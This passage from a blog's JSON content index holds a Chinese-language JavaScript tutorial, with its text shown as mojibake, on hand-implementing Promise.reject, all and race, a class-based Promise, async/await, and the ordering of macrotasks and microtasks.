Promise.reject(new Promise((resolve, reject) =&gt; { resolve('OK'); })); console.log(p); console.log(p2); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  reject æ–¹æ³• Promise.reject = function (reason) { return new Promise((resolve, reject) =&gt; { reject(reason); }); } 3 - Promise.all å°è£… éå†ä¼ å…¥çš„promiseæ•°ç»„,æ¯å½“éå†ç»“æœæ˜¯æˆåŠŸ,åˆ™ç”¨è®¡æ•°å™¨è®°å½•,å½“è®¡æ•°å™¨ç­‰åŒäºæ•°ç»„é•¿åº¦,åˆ™å…¨éƒ¨æˆåŠŸ,è¿™æ—¶å€™å¯ä»¥è¿”å›æˆåŠŸçŠ¶æ€ å¦‚æœå½“æ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªpromiseçš„æ‰§è¡Œç»“æœæ˜¯reject,ç›´æ¥ä¸­æ–­,è¿”å›çŠ¶æ€ä¸ºå¤±è´¥ htmlè°ƒç”¨------------------------------------------------------------ let p1 = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {resolve('OK'); }, 1000) }) let p2 = Promise.reject('Success'); let p3 = Promise.resolve('Oh Yeah'); //è°ƒç”¨ all æ–¹æ³• let result = Promise.all([p1, p2, p3]); console.log(result); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  all æ–¹æ³• Promise.all = function (promises) { //è¿”å›ç»“æœä¸ºpromiseå¯¹è±¡ return new Promise((resolve, reject) =&gt; { //å£°æ˜å˜é‡ let count = 0; let arr = []; //éå† for (let i = 0; i &lt; promises.length; i++) { promises[i].then(v =&gt; { //å¾—çŸ¥å¯¹è±¡çš„çŠ¶æ€æ˜¯æˆåŠŸ //æ¯ä¸ªpromiseå¯¹è±¡ éƒ½æˆåŠŸ count++; //å°†å½“å‰promiseå¯¹è±¡æˆåŠŸçš„ç»“æœ å­˜å…¥åˆ°æ•°ç»„ä¸­ arr[i] = v; //åˆ¤æ–­ if (count === promises.length) {resolve(arr);}//ä¿®æ”¹çŠ¶æ€ }, r =&gt; { reject(r); }); } }); } 4 - Promise.race å°è£… ç›´æ¥è°å…ˆæ‰§è¡Œå°±è¿”å›è°çš„è¿è¡Œç»“æœå³å¯ htmlè°ƒç”¨------------------------------------------------------------ let p1 = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {resolve('OK');}); }); let p2 = Promise.reject('Success'); let p3 = Promise.resolve('Oh Yeah'); //è°ƒç”¨ race æ–¹æ³• let result = Promise.race([p1, p2, p3]); console.log(result); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  race æ–¹æ³• Promise.race = function (promises) { return new Promise((resolve, reject) =&gt; { for (let i = 0; i &lt; promises.length; i++) { promises[i].then(v =&gt; { //ä¿®æ”¹è¿”å›å¯¹è±¡çš„çŠ¶æ€ä¸º ã€æˆåŠŸã€ resolve(v); }, r =&gt; { //ä¿®æ”¹è¿”å›å¯¹è±¡çš„çŠ¶æ€ä¸º ã€å¤±è´¥ã€ reject(r); }) } }); } â…¢-å…¶ä»–ä¼˜åŒ–1 - å›è°ƒå‡½æ•°ã€å¼‚æ­¥æ‰§è¡Œã€ å¦‚æœæˆ‘ä»¬è¿è¡Œä¸‹é¢ä»£ç ,æ­£ç¡®é¡ºåºæ˜¯: 111 â€“&gt; 333 â€“&gt;444 let p1 = new Promise((resolve, reject) =&gt; { reject('OK'); console.log(111); }); p1.then(value =&gt; { console.log(222); }, reason =&gt; { console.log(444); }); console.log(333); ä½†å½“æˆ‘ä»¬è¿è¡Œä¹‹å‰å°è£…çš„ Promise ä»£ç æ—¶,ç»“æœå´æ˜¯:111 â€“&gt; 444 â€“&gt; 333 æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„thenæ–¹æ³•å˜æˆå¼‚æ­¥æ–¹æ³• æˆ‘ä»¬åªè¦åœ¨ä»¥ä¸‹å››å¤„åœ°æ–¹çš„å›è°ƒå‡½æ•°è°ƒç”¨å¤–å±‚åŒ…è£¹ä¸€å±‚å®šæ—¶å™¨(ä¸ä¸€å®šæ˜¯å®šæ—¶å™¨,å¼€å¯å¼‚æ­¥å³å¯),å³å¯åšåˆ°å¼‚æ­¥æ“ä½œ function resolve(data){ setTimeout(() =&gt; { self.callbacks.forEach(item =&gt; { item.onResolved(data); }); });--ä¿®æ”¹1 } //reject å‡½æ•° function reject(data){ setTimeout(() =&gt; { self.callbacks.forEach(item =&gt; { item.onRejected(data); }); });---ä¿®æ”¹2 } &gt;//æ·»åŠ  then æ–¹æ³• &gt;Promise.prototype.then = function(onResolved, onRejected){ return new Promise((resolve, reject) =&gt; { //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState /* ä¿®æ”¹å‰ä»£ç  if (this.PromiseState === 'fulfilled') { callback(onResolved); } if (this.PromiseState === 'rejected') { callback(onRejected); */ if(this.PromiseState === 'fulfilled'){setTimeout(() =&gt; { callback(onResolved);});} -----ä¿®æ”¹3 if(this.PromiseState === 'rejected'){ setTimeout(() =&gt; { callback(onRejected);}); ---ä¿®æ”¹4 } } ç›¸å…³åŸç†å‚ç…§jsäº‹ä»¶å¾ªç¯æœºåˆ¶ã€å®ä»»åŠ¡ä¸å¾®ä»»åŠ¡ 2- classæ”¹å†™promise å…¶ä¸­å°†self=thisä¿å­˜thisæŒ‡å‘æ–¹å¼æ”¹ä¸ºç®­å¤´å‡½æ•°è¡¨ç¤º(åœ¨ä¸Šé¢ç¤ºä¾‹ä¸­ä¹Ÿæœ‰æ•ˆæœ) å°†å…¶æ”¹ä¸ºclasså†™æ³• ä¸‹é¢ä¸ºpromisedemo.jsä»£ç  &gt;class Promise { //æ„é€ æ–¹æ³• constructor(executor) { //æ·»åŠ å±æ€§ this.PromiseState = 'pending'; this.PromiseResult = null; //å£°æ˜å±æ€§ this.callbacks = []; //ä¿å­˜å®ä¾‹å¯¹è±¡çš„ this çš„å€¼ //resolve å‡½æ•° let resolve = (data) =&gt; { //åˆ¤æ–­çŠ¶æ€ if (this.PromiseState !== 'pending') return; //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) this.PromiseState = 'fulfilled'; // resolved //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) this.PromiseResult = data; //è°ƒç”¨æˆåŠŸçš„å›è°ƒå‡½æ•° setTimeout(() =&gt; { this.callbacks.forEach(item =&gt; { item.onResolved(data); }); }); } //reject å‡½æ•° let reject = (data) =&gt; { //åˆ¤æ–­çŠ¶æ€ if (this.PromiseState !== 'pending') return; //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) this.PromiseState = 'rejected'; // //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) this.PromiseResult = data; //æ‰§è¡Œå¤±è´¥çš„å›è°ƒ setTimeout(() =&gt; { this.callbacks.forEach(item =&gt; { item.onRejected(data); }); }); } try { //åŒæ­¥è°ƒç”¨ã€æ‰§è¡Œå™¨å‡½æ•°ã€ executor(resolve, reject); } catch (e) { //ä¿®æ”¹ promise å¯¹è±¡çŠ¶æ€ä¸ºã€å¤±è´¥ã€ reject(e); } } //then æ–¹æ³•å°è£… then(onResolved, onRejected) { //åˆ¤æ–­å›è°ƒå‡½æ•°å‚æ•° if (typeof onRejected !== 'function') { onRejected = reason =&gt; { throw reason; } } if (typeof onResolved !== 'function') { onResolved = value =&gt; value; //value =&gt; { return value}; } return new Promise((resolve, reject) =&gt; { //å°è£…å‡½æ•° let callback = (type) =&gt; { try { //è·å–å›è°ƒå‡½æ•°çš„æ‰§è¡Œç»“æœ let result = type(this.PromiseResult); //åˆ¤æ–­ if (result instanceof Promise) { //å¦‚æœæ˜¯ Promise ç±»å‹çš„å¯¹è±¡ result.then(v =&gt; { resolve(v); }, r =&gt; { reject(r); }) } else { //ç»“æœçš„å¯¹è±¡çŠ¶æ€ä¸ºã€æˆåŠŸã€ resolve(result); } } catch (e) { reject(e); } } //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState if (this.PromiseState === 'fulfilled') { setTimeout(() =&gt; { callback(onResolved); }); } if (this.PromiseState === 'rejected') { setTimeout(() =&gt; { callback(onRejected); }); } //åˆ¤æ–­ pending çŠ¶æ€ if (this.PromiseState === 'pending') { //ä¿å­˜å›è°ƒå‡½æ•° this.callbacks.push({ onResolved: function () { callback(onResolved); }, onRejected: function () { callback(onRejected); } }); } }) } //catch æ–¹æ³• catch (onRejected) { return this.then(undefined, onRejected); } //æ·»åŠ  resolve æ–¹æ³• static resolve(value) { //è¿”å›promiseå¯¹è±¡ return new Promise((resolve, reject) =&gt; { if (value instanceof Promise) { value.then(v =&gt; { resolve(v); }, r =&gt; { reject(r); }) } else { //çŠ¶æ€è®¾ç½®ä¸ºæˆåŠŸ resolve(value); } }); } //æ·»åŠ  reject æ–¹æ³• static reject(reason) { return new Promise((resolve, reject) =&gt; { reject(reason); }); } //æ·»åŠ  all æ–¹æ³• static all(promises) { //è¿”å›ç»“æœä¸ºpromiseå¯¹è±¡ return new Promise((resolve, reject) =&gt; { //å£°æ˜å˜é‡ let count = 0; let arr = []; //éå† for (let i = 0; i &lt; promises.length; i++) { // promises[i].then(v =&gt; { //å¾—çŸ¥å¯¹è±¡çš„çŠ¶æ€æ˜¯æˆåŠŸ //æ¯ä¸ªpromiseå¯¹è±¡ éƒ½æˆåŠŸ count++; //å°†å½“å‰promiseå¯¹è±¡æˆåŠŸçš„ç»“æœ å­˜å…¥åˆ°æ•°ç»„ä¸­ arr[i] = v; //åˆ¤æ–­ if (count === promises.length) { //ä¿®æ”¹çŠ¶æ€ resolve(arr); } }, r =&gt; { reject(r); }); } }); } //æ·»åŠ  race æ–¹æ³• static race(promises) { return new Promise((resolve, reject) =&gt; { for (let i = 0; i &lt; promises.length; i++) { promises[i].then(v =&gt; { //ä¿®æ”¹è¿”å›å¯¹è±¡çš„çŠ¶æ€ä¸º ã€æˆåŠŸã€ resolve(v); }, r =&gt; { //ä¿®æ”¹è¿”å›å¯¹è±¡çš„çŠ¶æ€ä¸º ã€å¤±è´¥ã€ reject(r); }) } }); } &gt;} htmlæ–‡ä»¶è°ƒç”¨ &gt;&lt;!DOCTYPE html&gt; &gt;&lt;html lang=\"en\"&gt; &gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;classç‰ˆæœ¬å°è£…&lt;/title&gt; &lt;script src=\"./promisedemo.js\"&gt;&lt;/script&gt; &gt;&lt;/head&gt; &gt;&lt;body&gt; &lt;script&gt; let p1 = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { // resolve(\"OK\"); reject(\"Erosssr\"); }) }); p1.then(value =&gt; { console.log(value); }, reason =&gt; { console.warn(reason); }); console.log(Promise.resolve('OK')); &lt;/script&gt; &gt;&lt;/body&gt; &gt;&lt;/html&gt; ä¸‰ã€Promise+ async + await 1)Promise==&gt;å¼‚æ­¥2)await==&gt;å¼‚æ­¥è½¬åŒæ­¥ await å¯ä»¥ç†è§£ä¸ºæ˜¯ async wait çš„ç®€å†™ã€‚await å¿…é¡»å‡ºç°åœ¨ async å‡½æ•°å†…éƒ¨ï¼Œä¸èƒ½å•ç‹¬ä½¿ç”¨ã€‚ await åé¢å¯ä»¥è·Ÿä»»ä½•çš„JS è¡¨è¾¾å¼ã€‚è™½ç„¶è¯´ await å¯ä»¥ç­‰å¾ˆå¤šç±»å‹çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®ƒæœ€ä¸»è¦çš„æ„å›¾æ˜¯ç”¨æ¥ç­‰å¾… Promise å¯¹è±¡çš„çŠ¶æ€è¢« resolvedã€‚å¦‚æœawaitçš„æ˜¯ promiseå¯¹è±¡ä¼šé€ æˆå¼‚æ­¥å‡½æ•°åœæ­¢æ‰§è¡Œå¹¶ä¸”ç­‰å¾… promise çš„è§£å†³,å¦‚æœç­‰çš„æ˜¯æ­£å¸¸çš„è¡¨è¾¾å¼åˆ™ç«‹å³æ‰§è¡Œ 3)async==&gt;åŒæ­¥è½¬å¼‚æ­¥ æ–¹æ³•ä½“å†…éƒ¨çš„æŸä¸ªè¡¨è¾¾å¼ä½¿ç”¨awaitä¿®é¥°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•ä½“æ‰€å±æ–¹æ³•å¿…é¡»è¦ç”¨asyncä¿®é¥°æ‰€ä»¥ä½¿ç”¨awitæ–¹æ³•ä¼šè‡ªåŠ¨å‡çº§ä¸ºå¼‚æ­¥æ–¹æ³• 4)mdnæ–‡æ¡£ async await â… -asyncå‡½æ•° å‡½æ•°çš„è¿”å›å€¼ä¸º promise å¯¹è±¡ promise å¯¹è±¡çš„ç»“æœç”± async å‡½æ•°æ‰§è¡Œçš„è¿”å›å€¼å†³å®š â…¡-awaitè¡¨è¾¾å¼ await å³ä¾§çš„è¡¨è¾¾å¼ä¸€èˆ¬ä¸º promise å¯¹è±¡, ä½†ä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒçš„å€¼ å¦‚æœè¡¨è¾¾å¼æ˜¯ promise å¯¹è±¡, await è¿”å›çš„æ˜¯ promise æˆåŠŸçš„å€¼ å¦‚æœè¡¨è¾¾å¼æ˜¯å…¶å®ƒå€¼, ç›´æ¥å°†æ­¤å€¼ä½œä¸º await çš„è¿”å›å€¼ â…¢-æ³¨æ„ await å¿…é¡»å†™åœ¨ async å‡½æ•°ä¸­, ä½† async å‡½æ•°ä¸­å¯ä»¥æ²¡æœ‰ await å¦‚æœ await çš„ promise å¤±è´¥äº†, å°±ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€è¦é€šè¿‡ tryâ€¦catch æ•è·å¤„ç† â…£-è‡ªå·±å¯¹æŸäº›é—®é¢˜ç†è§£è§£ç­”1ã€å¦‚ä½•åœ¨Promiseå¤–éƒ¨ä½¿ç”¨Promiseçš„ç»“æœ ç”¨åˆ°çš„æœ¬ç« èŠ‚çŸ¥è¯†: 1ã€axiosæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªpromise,æ‰€ä»¥ä¸‹é¢ç”¨å®šæ—¶å™¨+Promiseæ¨¡æ‹Ÿaxios,æ•ˆæœä¸€æ ·,å¯ä»¥å°†new Promise(resolve =&gt; {setTimeout(function() { resolve(\"promiseæ™®é€šç»“æœ\"); }, 1000); })ç­‰ä»·äºaxios({}) 2ã€resolve() ä¸reject()æ˜¯ä¿®æ”¹PromiseçŠ¶æ€å¹¶å¾€å¤–æŠ›å‡ºçš„,ä¸€ä¸ªPromiseåªèƒ½æ”¹å˜ä¸€æ¬¡çŠ¶æ€,æ‰€ä»¥ä¸€ä¸ªprimiseä¸­åªèƒ½è°ƒç”¨ä¸€æ¬¡ 3ã€ ä¸Šä¸€æ­¥æŠ›å‡ºåå¯ä»¥åœ¨ä¸‹é¢ çš„.then()ä¸­è·å–åˆ° â… -å¦‚æœæ²¡æœ‰ç”¨.then(),åˆ™å€¼ä¼šæŠ›å¾€Promiseå¤–éƒ¨ â…¡-å¦‚æœå£°æ˜äº†.then(),åˆ™å€¼ä¼šè¢«.then()æ¥ä½,æ”¾åˆ°é‡Œé¢å¤„ç†,å¦‚æœéœ€è¦å†æ¬¡æŠ›å‡ºâ€“æŸäº›ä¸šåŠ¡åœºæ™¯éœ€è¦ ,ç„¶ååœ¨ä¸‹ä¸€ä¸ªthen()æˆ–è€…å¤–éƒ¨ä½¿ç”¨, åˆ™å¯ä»¥ .then(v=&gt;return v) â€”å‰æè¿™ä¸ªé“¾å¼è°ƒç”¨å‰æ›¾ä½¿ç”¨è¿‡resolve() ä¸reject()æ‰ç”¨return,ä¸ç„¶å°±ç”¨è¿™ä¸¤ä¸ªresolve() ä¸reject() &gt;//è®²è§£æ—¶å†™çš„ç®€å•demo &gt;let resolveCommon = ()=&gt; { let result=\"æ™®é€špromiseåˆå§‹å€¼\" result=new Promise(resolve =&gt; {setTimeout(function() { resolve(\"promiseæ™®é€šç»“æœ\"); }, 1000); }) console.log(result) //æ‰“å°ç»“æœ: Promise { &lt;pending&gt; } &gt;}; &gt;let resolveAsync=async ()=&gt; { let result=\"await+asyncçš„promiseåˆå§‹å€¼\" result=await new Promise(resolve =&gt; { setTimeout(function() { resolve(\"è¿™æ˜¯async+awaitç»“æœ\"); }, 1000);}) console.log(result) //æ‰“å°ç»“æœ: è¿™æ˜¯async+awaitç»“æœ è¿™é‡Œå°±æ˜¯æ­£ç¡®çš„å€¼,ä½ å¯ä»¥åœ¨ä¸‹ä¸€æ­¥è¿›è¡Œæ­£å¸¸ä½¿ç”¨,ä¹Ÿå¯ä»¥ç”¨åœ¨ä¸‹ä¸€æ­¥çš„promiseä¸­ //------------------------------------------------------ //åœ¨ç¬¬äºŒä¸ªpromiseä¸­è°ƒç”¨ä½¿ç”¨ let result2=\"\" result2= await new Promise(resolve =&gt; { setTimeout(function() { resolve(result+\"+ç»è¿‡ç¬¬äºŒä¸ªpromiseåŠ å·¥\"); }, 1000);}) .then(v=&gt;{ console.log(\"ç¬¬äºŒä¸ªpromiseçš„then()ä¸­æ‰“å°å¹¶è¿”å›:\",v) return v+\",ç»è¿‡then()åŠ å·¥è¿”å›\" }) console.log(\"æœ€ç»ˆç»“æœ:ç¬¬äºŒä¸ªpromiseå¤–éƒ¨ç»“æœæ‰“å°,\",result2) //--------------------------------------------- &gt;}; &gt;resolveCommon() //è°ƒç”¨æ™®é€špromiseå‡½æ•° &gt;resolveAsync() //è°ƒç”¨await+async &gt;/** è¿è¡Œç»“æœ 1.resolveCommon() è¿è¡Œç»“æœ: Promise { &lt;pending&gt; } 2.resolveAsync() è¿è¡Œç»“æœ: è¿™æ˜¯async+awaitç»“æœ ç¬¬äºŒä¸ªpromiseçš„then()ä¸­æ‰“å°å¹¶è¿”å›: è¿™æ˜¯async+awaitç»“æœ+ç»è¿‡ç¬¬äºŒä¸ªpromiseåŠ å·¥ æœ€ç»ˆç»“æœ:ç¬¬äºŒä¸ªpromiseå¤–éƒ¨ç»“æœæ‰“å°, è¿™æ˜¯async+awaitç»“æœ+ç»è¿‡ç¬¬äºŒä¸ªpromiseåŠ å·¥,ç»è¿‡then()åŠ å·¥è¿”å› &gt;*/ åŸå› è§£æ: new Promise()æ˜¯ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡,ä¼šåŠ åˆ°å¼‚æ­¥é˜Ÿåˆ—ä¸­,è€Œæ­£å¸¸è¿è¡Œæ¯”å¦‚console.log()æ˜¯åŒæ­¥è¿è¡Œçš„(å³ä»ä¸Šå¾€ä¸‹è¿è¡Œ),ä¼šåŠ åˆ°åŒæ­¥é˜Ÿåˆ— æ‰€ä»¥ Promise()é€šå¸¸æ˜¯ä¼šåœ¨åŒä¸€ç­‰çº§çš„åŒæ­¥ä»»åŠ¡ä¹‹åæ‰å¾—åˆ°ç»“æœçš„ æ‰€ä»¥ä½ å¾—åˆ°çš„æ˜¯ä¸€ä¸ªæŒ‚èµ·çš„ Promise { } å¯¹è±¡ è€Œawaitåˆ™æ˜¯è®©è·Ÿåœ¨åé¢çš„å¼‚æ­¥ä»»åŠ¡è½¬ä¸ºåŒæ­¥ä»»åŠ¡(æ•ˆæœå¦‚æ­¤,å°±é€šä¿—æ¥è®²,å…·ä½“æ¦‚å¿µéœ€è¦è‡ªå­¦),æ‰€ä»¥resultå°±èƒ½å¾—åˆ°ä¸€ä¸ªå·²ç»ä¿®æ”¹çŠ¶æ€ä¸ºæˆåŠŸæˆ–è€…å¤±è´¥çš„å€¼ æ‰€ä»¥ä¸‹é¢çš„ä»»åŠ¡å°±å¯ä»¥ä½¿ç”¨åˆ°è¿™ä¸ªå€¼ ä¸ºä»€ä¹ˆè¿™äº›æ“ä½œè¦æ”¾åœ¨åŒä¸€ä¸ªasync fn()=&gt;{} ä¸­? 1)Promise==&gt;å¼‚æ­¥ 2)await==&gt;å¼‚æ­¥è½¬åŒæ­¥ await å¯ä»¥ç†è§£ä¸ºæ˜¯ async wait çš„ç®€å†™ã€‚await å¿…é¡»å‡ºç°åœ¨ async å‡½æ•°å†…éƒ¨ï¼Œä¸èƒ½å•ç‹¬ä½¿ç”¨ã€‚ await åé¢å¯ä»¥è·Ÿä»»ä½•çš„JS è¡¨è¾¾å¼ã€‚è™½ç„¶è¯´ await å¯ä»¥ç­‰å¾ˆå¤šç±»å‹çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®ƒæœ€ä¸»è¦çš„æ„å›¾æ˜¯ç”¨æ¥ç­‰å¾… Promise å¯¹è±¡çš„çŠ¶æ€è¢« resolvedã€‚å¦‚æœawaitçš„æ˜¯ promiseå¯¹è±¡ä¼šé€ æˆå¼‚æ­¥å‡½æ•°åœæ­¢æ‰§è¡Œå¹¶ä¸”ç­‰å¾… promise çš„è§£å†³,å¦‚æœç­‰çš„æ˜¯æ­£å¸¸çš„è¡¨è¾¾å¼åˆ™ç«‹å³æ‰§è¡Œ 3)async==&gt;åŒæ­¥è½¬å¼‚æ­¥ æ–¹æ³•ä½“å†…éƒ¨çš„æŸä¸ªè¡¨è¾¾å¼ä½¿ç”¨awaitä¿®é¥°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•ä½“æ‰€å±æ–¹æ³•å¿…é¡»è¦ç”¨asyncä¿®é¥°æ‰€ä»¥ä½¿ç”¨awitæ–¹æ³•ä¼šè‡ªåŠ¨å‡çº§ä¸ºå¼‚æ­¥æ–¹æ³• å››ã€å®ä»»åŠ¡ä¸å¾®ä»»åŠ¡â… -è¯´æ˜ åŸç†å›¾: è¯´æ˜: JSä¸­ç”¨æ¥å­˜å‚¨å¾…æ‰§è¡Œå›è°ƒå‡½æ•°çš„é˜Ÿåˆ—åŒ…å«2ä¸ªä¸åŒç‰¹å®šçš„åˆ—é˜Ÿ å®é˜Ÿåˆ—:ç”¨æ¥ä¿å­˜å¾…æ‰§è¡Œçš„å®ä»»åŠ¡(å›è°ƒ),æ¯”å¦‚:å®šæ—¶å™¨å›è°ƒ/ajaxå›è°ƒ/domäº‹ä»¶å›è°ƒ å¾®é˜Ÿåˆ—:ç”¨æ¥ä¿å­˜å¾…æ‰§è¡Œçš„å¾®ä»»åŠ¡(å›è°ƒ),æ¯”å¦‚:Promiseçš„å›è°ƒ/muntationå›è°ƒ JSæ‰§è¡Œæ—¶ä¼šåŒºåˆ«è¿™2ä¸ªé˜Ÿåˆ—: JSæ‰§è¡Œå¼•æ“é¦–å…ˆå¿…é¡»æ‰§è¡Œæ‰€æœ‰çš„åˆå§‹åŒ–åŒæ­¥ä»»åŠ¡ä»£ç  æ¯æ¬¡å‡†å¤‡å–å‡ºç¬¬ä¸€ä¸ªå®ä»»åŠ¡æ‰§è¡Œå‰,éƒ½è¦å°†æ‰€æœ‰çš„å¾®ä»»åŠ¡ä¸€ä¸ªä¸€ä¸ªå–å‡ºæ¥æ‰§è¡Œ åŒæ­¥ä»»åŠ¡ â€“&gt; å¾®ä»»åŠ¡ â€“&gt; å®ä»»åŠ¡ â…¡-ä»£ç ä¸ç¤ºä¾‹ ä½ éœ€è¦ä¸€äº›æ —å­æ¥å¸®åŠ©éªŒè¯è‡ªå·±çš„æƒ³æ³•æ˜¯å¦æ­£ç¡®,å°½é‡å…ˆä¸çœ‹ç»“æœå»è‡ªå·±æ€è€ƒä¸‹æ‰“å°ç»“æœé¡ºåº 1ã€ä»£ç ç¤ºä¾‹:a) é¦–å…ˆç»™å‡ºæ³¨é‡Šçš„æ —å­ä¸¾ä¸€ä¸ª æ­¤å¤„ä¼šç»™å‡ºæ¯ä¸ªæ‰“å°æ”¾å…¥ä»€ä¹ˆé˜Ÿåˆ—,åŠ æ·±ä½ çš„å°è±¡ setTimeout(() =&gt; { console.log('timeout callback1ï¼ˆï¼‰')//ç«‹å³æ”¾å…¥å®é˜Ÿåˆ— Promise.resolve(3).then( value =&gt; { console.log('Promise onResolved3()', value)//å½“è¿™ä¸ªå®ä»»åŠ¡æ‰§è¡Œå ç«‹é©¬æ”¾å…¥å¾®é˜Ÿåˆ—,æ‰€ä»¥è¿™ä¸ªå¾®ä»»åŠ¡æ‰§è¡Œå®Œåä¸‹ä¸ªå®ä»»åŠ¡æ‰èƒ½æ‰§è¡Œ } ) }, 0) setTimeout(() =&gt; { console.log('timeout callback2ï¼ˆï¼‰') //ç«‹å³æ”¾å…¥å®é˜Ÿåˆ—, }, 0) Promise.resolve(1).then( value =&gt; { console.log('Promise onResolved1()', value)//ç«‹å³æ”¾å…¥å¾®é˜Ÿåˆ— setTimeout(() =&gt; { console.log('timeout callback3ï¼ˆï¼‰', value) //ç«‹å³æ”¾å…¥å®ä»»åŠ¡ }, 0) } ) Promise.resolve(2).then( value =&gt; { console.log('Promise onResolved2()', value)//ç«‹å³æ”¾å…¥å¾®é˜Ÿåˆ— } ) console.log('åŒæ­¥ä»£ç ') //åŒæ­¥ä»£ç ç«‹å³æ‰§è¡Œ ç»“æœæ”¾åœ¨ä¸‹æ–¹,å°±æ€•ä½ ä¸å°å¿ƒç„åˆ° b) å°è¯•è‡ªå·±æ€è€ƒä¸‹ å°è¯•è‡ªå·±è„‘æµ·ä¸­ç”¨è‡ªå·±ç†è§£ â€˜è¿è¡Œâ€™ ä¸€ä¸‹, ç„¶åæŠŠç»“æœå†™ä¸‹æ¥,å†å»ä¸‹é¢ç»“æœåšå¯¹æ¯” &gt;setTimeout(() =&gt; console.log('ä»£ç å¼€å§‹æ‰§è¡Œ'),0) &gt;new Promise((resolve,reject) =&gt; { console.log('å¼€å§‹forå¾ªç¯'); for(let i=0;i&lt;10000;i++){ i == 99 &amp;&amp; resolve() } &gt;}).then(() =&gt; console.log('æ‰§è¡Œthenå‡½æ•°')) &gt;console.log('ä»£ç æ‰§è¡Œç»“æŸ'); 2ã€ç¤ºä¾‹ç»“æœ:a) ç¬¬ä¸€ä¸ªæ —å­çš„ç»“æœ 'åŒæ­¥ä»£ç ', 'Promise onResolved1()', 'Promise onResolved2()', 'timeout callback1ï¼ˆï¼‰', 'Promise onResolved3()', 'timeout callback2ï¼ˆï¼‰', 'timeout callback3ï¼ˆï¼‰' b) ç¬¬äºŒä¸ªæ —å­çš„ç»“æœ PS: å¯ä»¥å¿½ç•¥undefinedè¿™ä¸ªæ‰“å°ç»“æœ, å› ä¸ºè¿™ä¼šåŠ é‡æˆ‘ä»¬å¯¹äºå®ä»»åŠ¡ä¸å¾®ä»»åŠ¡çš„ç†è§£è´Ÿæ‹…. å½“ç„¶äººéƒ½æ˜¯ä¼šå¥½å¥‡çš„,æ²¡æœ‰æ‰“ç ´ç ‚é”…é—®åˆ°åº•çš„ç²¾ç¥å‘¢ä¹Ÿå½“ä¸äº†ä¸€ä¸ªå¥½ç¨‹åºå‘˜,é‚£æˆ‘å°±åœ¨ä¸‹æ–¹é¢å¤–ç»™å‡ºè§£é‡Š äº”ã€å¯¹æµè§ˆå™¨consoleæ§åˆ¶å°è¾“å‡ºundefinedçš„åˆ†æâ… - å‡ºç°åœºæ™¯ â…¡ - å°è¯•è¾“å…¥å…¶ä»–å†…å®¹è¿›è¡Œåˆ†æ é‚£ä¹ˆåšä¸ªåˆç†æ¨æµ‹: åº”è¯¥æ˜¯åœ¨æ§åˆ¶å°è¾“å…¥çš„å†…å®¹,å®ƒçš„ è¿”å›å€¼ ä¼šæ˜¾ç¤ºå‡ºæ¥,è¿™è®©æˆ‘ä»¬ä¸ç¦æƒ³åˆ°JSçš„ [ eval() ] â…¢ - evalï¼ˆstringï¼‰ å…¶ä½œç”¨æ˜¯å°† æ¥æ”¶çš„ string å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¯¹å…¶è¿›è¡ŒJavaScript è¡¨è¾¾å¼æˆ–è¯­å¥ è®¡ç®—ï¼Œè¿”å›å¾—åˆ°çš„å€¼ï¼› å¦‚æœæ˜¯æ²¡æœ‰è¿”å›å€¼çš„è¡¨è¾¾å¼æˆ–è¯­å¥ï¼Œåˆ™ä¼šè¿”å› undefined ï¼› å¦‚æœæ²¡æœ‰åˆæ³•çš„è¡¨è¾¾å¼å’Œè¯­å¥ï¼Œåˆ™ä¼šæŠ›å‡º SyntaxError å¼‚å¸¸ ã€‚ äºæ˜¯æˆ‘ä»¬å¯ä»¥çŒœæµ‹Consoleæ§åˆ¶å°çš„å®è´¨ å°±æ˜¯ è°ƒç”¨äº†evalï¼ˆï¼‰å‡½æ•° â…£ - éªŒè¯ä¸€ä¸‹ å¤§å®¶éƒ½æ˜¯èªæ˜äºº,çœ‹åˆ°è¿™ä¸ªç»“æœåº”è¯¥å°±ä¸ç”¨æˆ‘ç»„ç»‡è¯­è¨€æ¥è§£é‡Šäº†å§ â…¤ - åˆ†æå…¶åœ¨å®ä»»åŠ¡ä¸å¾®ä»»åŠ¡çš„æ‰“å°é¡ºåº é¦–å…ˆçœ‹å›¾: å¯ä»¥çœ‹åˆ° [ undefined ] å®åœ¨å¾®ä»»åŠ¡å®Œæˆå,å®ä»»åŠ¡æ‰§è¡Œå‰ æ‰“å°","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://serein.icu/categories/JavaScript/"}],"tags":[{"name":"Promise","slug":"Promise","permalink":"https://serein.icu/tags/Promise/"}]},{"title":"ES6å­¦ä¹ ç¬”è®°","slug":"PDF01","date":"2022-03-18T13:00:00.000Z","updated":"2022-03-19T02:49:58.947Z","comments":true,"path":"posts/5.html","link":"","permalink":"https://serein.icu/posts/5.html","excerpt":"","text":"ç®€ä»‹ES6ï¼Œ å…¨ç§° ECMAScript 6.0 ï¼Œæ˜¯ JavaScript çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬æ ‡å‡†ï¼Œ2015.06 